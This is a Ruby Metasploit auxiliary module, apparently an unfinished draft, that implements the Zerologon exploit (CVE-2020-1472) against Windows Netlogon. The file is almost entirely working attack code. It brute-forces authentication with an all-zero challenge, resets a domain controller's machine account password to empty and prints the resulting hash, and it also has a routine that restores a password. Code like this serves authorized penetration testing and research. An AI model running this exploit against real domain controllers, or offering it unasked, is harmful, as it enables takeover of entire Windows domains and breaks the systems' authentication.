##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Auxiliary::Report

  Netlogon = RubySMB::Dcerpc::Netlogon
  EMPTY_SHARED_SECRET = OpenSSL::Digest::MD4.digest('')

  def initialize(info = {})
    super(update_info(info,
      'Name'           => '',
      'Description'    => %q{

      },

      'Author'         => [
          # todo: add author credits from the references
      ],
      'Notes' => {
        'AKA' => [ 'Zerologon' ]
      },
      'License'        => MSF_LICENSE,
      'Actions' => [
          [ 'REMOVE', { 'Description' => 'Remove the machine account password' } ],
          [ 'RESTORE', { 'Description' => 'Restore the machine account password' } ]
        ],
      'DefaultAction'  => 'REMOVE',
      'References'     => [
        ['URL', 'https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py'],
        ['URL', 'https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py']
      ]
    ))

    register_options(
      [
        Opt::RPORT(0),
        OptString.new('SERVER_NAME', [ true, 'The server\'s NetBIOS name', '', true ]),
        OptString.new('PASSWORD', [ false, 'The password to set' ]),
      ])

  end

  def run
    dport = datastore['RPORT']
    if dport.nil? || dport == 0
      dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], Netlogon::UUID, '1.0', 'ncacn_ip_tcp')

      unless dport
        print_error('Could not determine the RPC port used by the Microsoft Netlogon Server')
        # todo: switch this to a fail_with
        return
      end
    end

    # Bind to the service
    handle = dcerpc_handle(Netlogon::UUID, '1.0', 'ncacn_ip_tcp', [dport])
    print_status("Binding to #{handle} ...")
    dcerpc_bind(handle)
    print_status("Bound to #{handle} ...")

    case action.name
    when 'REMOVE'
      action_remove_password
    when 'RESTORE'
      action_restore_password
    end
  end

  def action_remove_password
    status = nil
    2000.times do
      netr_server_req_challenge
      response = netr_server_authenticate3

      break if (status = response.status) == 0
    end

    return unless status == 0
    print_good('Successfully authenticated')

    response = netr_server_password_set2
    status = response.last(4).unpack('V').first
    if status == 0
      print_good("Successfully set the machine account (#{datastore['SERVER_NAME']}$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0")
    else
      print_error("Password change failed with NT status: 0x#{status.to_s(16)}")
    end
  end

  def action_restore_password
    client_challenge = OpenSSL::Random.random_bytes(8)

    response = netr_server_req_challenge(client_challenge: client_challenge)
    session_key = Netlogon.calculate_session_key(EMPTY_SHARED_SECRET, client_challenge, response.server_challenge)
    ppp = encrypt_netlogon_credential(client_challenge, session_key)

    response = netr_server_authenticate3(client_credential: ppp)
    unless response.status == 0
      print_error('Failed to authenticate')
      return
    end

    password = [datastore['PASSWORD']].pack('H*')

    new_password_data = ("\x00" * (512 - password.length)) + password + [password.length].pack('V')
    response = netr_server_password_set2(
      authenticator: Netlogon::NetlogonAuthenticator.new(
        credential: encrypt_netlogon_credential([ppp.unpack('Q').first + 10].pack('Q'), session_key),
        timestamp: 10
      ),
      clear_new_password: encrypt_netlogon_credential(new_password_data, session_key)
    )

    if (response.last(4).unpack('V').first) == 0
      print_good('Successfully set the computer password')
    end
  end

  def netr_server_authenticate3(client_credential: nil)
    nrpc_call('NetrServerAuthenticate3',
      primary_name: "\\\\#{datastore['SERVER_NAME']}",
      account_name: "#{datastore['SERVER_NAME']}$",
      secure_channel_type: 6, # SERVER_SECURE_CHANNEL
      computer_name: datastore['SERVER_NAME'],
      client_credential: client_credential,
      flags: 0x212fffff
    )
  end

  def netr_server_password_set2(authenticator: nil, clear_new_password: nil)
    authenticator ||= Netlogon::NetlogonAuthenticator.new
    request = NetrServerPasswordSet2Request.new(
      primary_name: "\\\\#{datastore['SERVER_NAME']}",
      account_name: "#{datastore['SERVER_NAME']}$",
      secure_channel_type: 6, # SERVER_SECURE_CHANNEL
      computer_name: datastore['SERVER_NAME'],
      authenticator: authenticator,
      clear_new_password: clear_new_password
    )
    dcerpc.call(request.opnum, request.to_binary_s)
  end

  def netr_server_req_challenge(client_challenge: "\x00" * 8)
    nrpc_call('NetrServerReqChallenge',
      primary_name: "\\\\#{datastore['SERVER_NAME']}",
      computer_name: datastore['SERVER_NAME'],
      client_challenge: client_challenge
    )
  end

  def nrpc_call(name, **kwargs)
    request = Netlogon.const_get("#{name}Request").new(**kwargs)
    Netlogon.const_get("#{name}Response").read(dcerpc.call(request.opnum, request.to_binary_s))
  end

  # [3.5.4.4.5 NetrServerPasswordSet2 (Opnum 30)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81)
  class NetrServerPasswordSet2Request < BinData::Record
    # quick 'n dirty structure definition for NetrServerPasswordSet2, the primary limitation is what would be a complex,
    # involved NL_TRUST_PASSWORD implementation to handle each of the 3 variants in which data can be stored
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/52d5bd86-5caf-47aa-aae4-cadf7339ec83
    attr_reader :opnum

    endian :little

    ndr_lp_str             :primary_name
    ndr_string             :account_name
    ndr_enum               :secure_channel_type
    ndr_string             :computer_name
    netlogon_authenticator :authenticator
    string                  :clear_new_password, length: 516

    def initialize_instance
      super
      @opnum = Netlogon::NETR_SERVER_PASSWORD_SET2
    end
  end

  def encrypt_netlogon_credential(input_data, key)
    cipher = OpenSSL::Cipher.new('AES-128-CFB8').encrypt
    cipher.iv = "\x00" * 16
    cipher.key = key
    cipher.update(input_data) + cipher.final
  end
end
